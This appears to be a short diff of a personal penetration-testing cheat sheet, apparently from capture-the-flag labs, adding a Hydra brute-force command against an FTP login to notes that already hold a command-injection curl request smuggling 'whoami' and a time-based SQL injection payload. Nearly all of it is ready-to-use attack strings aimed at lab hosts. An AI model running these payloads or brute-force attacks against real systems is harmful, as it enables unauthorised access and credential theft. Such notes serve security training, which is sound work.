@@ -33,3 +33,6 @@ curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
 
 #SQLI
 https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like 'password';--
+
+#Hydra
+hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.101.244 ftp
